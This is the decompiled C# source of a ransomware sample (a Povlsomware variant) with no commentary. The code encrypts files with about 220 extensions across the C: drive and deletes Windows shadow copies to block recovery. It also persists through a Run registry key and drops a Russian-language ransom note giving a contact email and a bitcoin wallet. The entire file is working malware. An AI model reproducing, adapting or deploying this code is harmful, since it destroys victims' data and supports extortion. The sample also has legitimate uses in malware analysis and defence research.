// Decompiled with JetBrains decompiler
// Type: Povlsomware.Program
// Assembly: Перечень деталей, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 448C2CEC-B30A-45B8-87A1-D980E6A14CD3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-37ca7a3b52d6cb9d9ebb9319c5f28f7b1e0ebb338bf732ace170684eb193b10e.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;

namespace Povlsomware
{
  internal class Program
  {
    public static int count = 0;
    public static List<string> encryptedFiles = new List<string>();
    private static readonly string password = "udfzlcnc89ec0";
    private static readonly string[] extensionsToEncrypt = new string[220]
    {
      ".png",
      ".txt",
      ".doc",
      ".docx",
      ".xls",
      ".xlsx",
      ".ppt",
      ".pptx",
      ".odt",
      "jpeg",
      ".csv",
      ".sql",
      ".mdb",
      ".sln",
      ".php",
      ".asp",
      ".aspx",
      ".html",
      ".xml",
      ".psd",
      ".sql",
      ".mp4",
      ".7z",
      ".rar",
      ".m4a",
      ".wma",
      ".avi",
      ".wmv",
      ".d3dbsp",
      ".zip",
      ".sie",
      ".sum",
      ".ibank",
      ".t13",
      ".t12",
      ".qdf",
      ".gdb",
      ".tax",
      ".pkpass",
      ".bc6",
      ".bc7",
      ".bkp",
      ".qic",
      ".bkf",
      ".sidn",
      ".sidd",
      ".mddata",
      ".itl",
      ".itdb",
      ".icxs",
      ".hvpl",
      ".hplg",
      ".hkdb",
      ".mdbackup",
      ".syncdb",
      ".gho",
      ".cas",
      ".svg",
      ".map",
      ".wmo",
      ".itm",
      ".sb",
      ".fos",
      ".mov",
      ".vdf",
      ".ztmp",
      ".sis",
      ".sid",
      ".ncf",
      ".menu",
      ".layout",
      ".dmp",
      ".blob",
      ".esm",
      ".vcf",
      ".vtf",
      ".dazip",
      ".fpk",
      ".mlx",
      ".kf",
      ".iwd",
      ".vpk",
      ".tor",
      ".psk",
      ".rim",
      ".w3x",
      ".fsh",
      ".ntl",
      ".arch00",
      ".lvl",
      ".snx",
      ".cfr",
      ".ff",
      ".vpp_pc",
      ".lrf",
      ".m2",
      ".mcmeta",
      ".vfs0",
      ".mpqge",
      ".kdb",
      ".db0",
      ".dba",
      ".rofl",
      ".hkx",
      ".bar",
      ".upk",
      ".das",
      ".iwi",
      ".litemod",
      ".asset",
      ".forge",
      ".ltx",
      ".bsa",
      ".apk",
      ".re4",
      ".sav",
      ".lbf",
      ".slm",
      ".bik",
      ".epk",
      ".rgss3a",
      ".pak",
      ".big",
      "wallet",
      ".wotreplay",
      ".xxx",
      ".desc",
      ".py",
      ".m3u",
      ".flv",
      ".js",
      ".css",
      ".rb",
      ".p7c",
      ".pk7",
      ".p7b",
      ".p12",
      ".pfx",
      ".cf",
      ".cfu",
      ".cfe",
      ".dt",
      ".epf",
      ".1cd",
      ".cdn",
      ".mxl",
      ".grs",
      ".crt",
      ".cer",
      ".der",
      ".x3f",
      ".srw",
      ".pef",
      ".ptx",
      ".r3d",
      ".rw2",
      ".rwl",
      ".raw",
      ".raf",
      ".orf",
      ".nrw",
      ".mrwref",
      ".mef",
      ".erf",
      ".kdc",
      ".dcr",
      ".cr2",
      ".crw",
      ".bay",
      ".sr2",
      ".srf",
      ".arw",
      ".3fr",
      ".dng",
      ".jpe",
      ".jpg",
      ".cdr",
      ".indd",
      ".ai",
      ".eps",
      ".pdf",
      ".pdd",
      ".dbf",
      ".mdf",
      ".wb2",
      ".rtf",
      ".wpd",
      ".dxg",
      ".xf",
      ".dwg",
      ".pst",
      ".accdb",
      ".mdb",
      ".pptm",
      ".pptx",
      ".ppt",
      ".xlk",
      ".xlsb",
      ".xlsm",
      ".xlsx",
      ".xls",
      ".wps",
      ".docm",
      ".odb",
      ".odc",
      ".odm",
      ".odp",
      ".ods",
      ".odt",
      ".cs",
      ".exe",
      ".lnk",
      ".mpeg",
      ".mp3",
      ".mkv",
      ".divx",
      ".ogg",
      ".wav",
      ".bat",
      ".index"
    };

    [STAThread]
    public static string GetPass() => Program.password;

    private static void Main()
    {
      Program.Attack();
      Program.DestroyCopy();
      Program.SetStartup();
      Program.CreateUI();
    }

    private static void SetStartup()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      if (registryKey.GetValue("Sistem32") != null || Application.ExecutablePath.Contains("rundll32.exe"))
        return;
      registryKey.SetValue("Sistem32", (object) ("\"" + Application.ExecutablePath + "\""));
    }

    private static void CreateUI()
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.Run((Form) new PayM3());
    }

    public static void DecryptFile(string fileEncrypted, string password)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes);
      byte[] buffer = Program.AES_Decrypt(((IEnumerable<byte>) File.ReadAllBytes(fileEncrypted)).Skip<byte>(4).ToArray<byte>(), hash);
      FileStream fileStream1 = File.Open(fileEncrypted, FileMode.Open);
      fileStream1.SetLength(0L);
      fileStream1.Close();
      using (FileStream fileStream2 = new FileStream(fileEncrypted, FileMode.Append))
      {
        fileStream2.Write(buffer, 0, buffer.Length);
        Console.WriteLine("Decrypted: " + fileEncrypted);
      }
    }

    public static void DestroyCopy()
    {
      File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Наши контакты.txt"), "revilsapport@mail.ru почта для связи с нами;  bc1qcmzxqunjy4jdprpz475kaprghgfnxqk9856zz5  номер нашего биткоин кошелька;  YenYeBTpde ваш индификатор.");
      bool flag;
      using (WindowsIdentity current = WindowsIdentity.GetCurrent())
        flag = new WindowsPrincipal(current).IsInRole(WindowsBuiltInRole.Administrator);
      if (!flag)
        return;
      foreach (ManagementObject instance in new ManagementClass("\\\\.\\ROOT\\cimv2" + ":" + "Win32_ShadowCopy").GetInstances())
        instance.Delete();
    }

    public static void EncryptFile(string fileUnencrypted)
    {
      byte[] bytes1 = Encoding.UTF8.GetBytes(Program.password);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      byte[] buffer = Program.AES_Encrypt(File.ReadAllBytes(fileUnencrypted), hash);
      FileStream fileStream1 = File.Open(fileUnencrypted, FileMode.Open);
      fileStream1.SetLength(0L);
      fileStream1.Close();
      using (FileStream fileStream2 = new FileStream(fileUnencrypted, FileMode.Append))
      {
        if (!fileStream2.CanWrite)
          return;
        byte[] bytes2 = Encoding.UTF8.GetBytes("P0vL");
        fileStream2.Write(bytes2, 0, bytes2.Length);
        fileStream2.Write(buffer, 0, buffer.Length);
        Console.WriteLine("Encrypted: " + fileUnencrypted);
        ++Program.count;
        Program.encryptedFiles.Add(fileUnencrypted);
      }
    }

    public static void Attack() => Program.ProcessDirectory("C:\\", 1, "");

    public static void UndoAttack(string decryption_password) => Program.ProcessDirectory("C:\\", 0, decryption_password);

    public static void ProcessDirectory(string targetDirectory, int action, string password)
    {
      foreach (string fileName in Directory.EnumerateFiles(targetDirectory, "*.*").Where<string>((Func<string, bool>) (file => ((IEnumerable<string>) Program.extensionsToEncrypt).Any<string>((Func<string, bool>) (x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))))))
        Program.ProcessFile(fileName, action, password);
      foreach (string directory in Directory.GetDirectories(targetDirectory))
      {
        try
        {
          if (!directory.Contains("All Users\\Microsoft\\") && !directory.Contains("$Recycle.Bin") && !directory.Contains("C:\\Windows") && !directory.Contains("C:\\Program Files") && !directory.Contains("Temporary Internet Files") && !directory.Contains("AppData\\") && !directory.Contains("\\source\\") && !directory.Contains("C:\\ProgramData\\") && !directory.Contains("\\Povlsomware-master\\") && !directory.Contains("\\Povlsomware\\"))
            Program.ProcessDirectory(directory, action, password);
        }
        catch
        {
        }
      }
    }

    public static bool IsMarked(string fileName)
    {
      if (!((IEnumerable<byte>) Encoding.ASCII.GetBytes("P0vL")).SequenceEqual<byte>((IEnumerable<byte>) ((IEnumerable<byte>) File.ReadAllBytes(fileName)).Take<byte>(4).ToArray<byte>()))
        return false;
      ++Program.count;
      Program.encryptedFiles.Add(fileName);
      return true;
    }

    public static void ProcessFile(string fileName, int action, string password)
    {
      if (action == 1 && !Program.IsMarked(fileName))
      {
        try
        {
          Program.EncryptFile(fileName);
        }
        catch
        {
        }
      }
      else
      {
        if (action != 0 || !Program.IsMarked(fileName))
          return;
        try
        {
          Program.DecryptFile(fileName, password);
        }
        catch
        {
        }
      }
    }

    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] numArray = (byte[]) null;
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
      }
      return numArray;
    }

    public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
    {
      byte[] numArray = (byte[]) null;
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
      }
      return numArray;
    }
  }
}
